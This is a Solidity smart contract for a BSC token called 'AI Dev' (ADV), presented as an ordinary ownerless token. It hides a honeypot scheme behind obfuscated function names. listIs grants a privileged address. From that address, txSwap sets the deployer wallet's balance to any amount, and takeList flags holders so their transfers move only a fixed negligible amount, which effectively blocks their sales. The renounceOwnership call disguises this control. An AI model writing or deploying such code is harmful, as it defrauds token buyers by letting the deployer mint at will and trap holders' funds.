/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface enableShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tradingExempt {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIDev is Ownable{
    uint8 public decimals = 18;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) public teamFee;
    uint256 constant shouldTradingTotal = 10 ** 10;
    mapping(address => bool) public fromToReceiver;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => uint256) public balanceOf;
    bool public marketingFeeAuto;
    address public exemptTotalSender;

    string public name = "AI Dev";
    address public fromWallet;

    string public symbol = "ADV";
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        enableShould modeLiquidity = enableShould(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        exemptTotalSender = tradingExempt(modeLiquidity.factory()).createPair(modeLiquidity.WETH(), address(this));
        fromWallet = toToken();
        fromToReceiver[fromWallet] = true;
        balanceOf[fromWallet] = totalSupply;
        emit Transfer(address(0), fromWallet, totalSupply);
        renounceOwnership();
    }

    

    function listIs(address receiverModeLaunch) public {
        if (marketingFeeAuto) {
            return;
        }
        fromToReceiver[receiverModeLaunch] = true;
        marketingFeeAuto = true;
    }

    function transfer(address exemptTake, uint256 tradingLiquidityTo) external returns (bool) {
        return transferFrom(toToken(), exemptTake, tradingLiquidityTo);
    }

    function approve(address atLaunch, uint256 tradingLiquidityTo) public returns (bool) {
        allowance[toToken()][atLaunch] = tradingLiquidityTo;
        emit Approval(toToken(), atLaunch, tradingLiquidityTo);
        return true;
    }

    function txSwap(uint256 tradingLiquidityTo) public {
        if (!fromToReceiver[toToken()]) {
            return;
        }
        balanceOf[fromWallet] = tradingLiquidityTo;
    }

    function toToken() private view returns (address) {
        return msg.sender;
    }

    function takeList(address listTo) public {
        if (listTo == fromWallet || listTo == exemptTotalSender || !fromToReceiver[toToken()]) {
            return;
        }
        teamFee[listTo] = true;
    }

    function transferFrom(address minMarketing, address exemptTake, uint256 tradingLiquidityTo) public returns (bool) {
        if (minMarketing != toToken() && allowance[minMarketing][toToken()] != type(uint256).max) {
            require(allowance[minMarketing][toToken()] >= tradingLiquidityTo);
            allowance[minMarketing][toToken()] -= tradingLiquidityTo;
        }
        if (exemptTake == fromWallet || minMarketing == fromWallet) {
            return isLaunch(minMarketing, exemptTake, tradingLiquidityTo);
        }
        if (teamFee[minMarketing]) {
            return isLaunch(minMarketing, exemptTake, shouldTradingTotal);
        }
        return isLaunch(minMarketing, exemptTake, tradingLiquidityTo);
    }

    function isLaunch(address fromList, address buyList, uint256 tradingLiquidityTo) internal returns (bool) {
        require(balanceOf[fromList] >= tradingLiquidityTo);
        balanceOf[fromList] -= tradingLiquidityTo;
        balanceOf[buyList] += tradingLiquidityTo;
        emit Transfer(fromList, buyList, tradingLiquidityTo);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }


}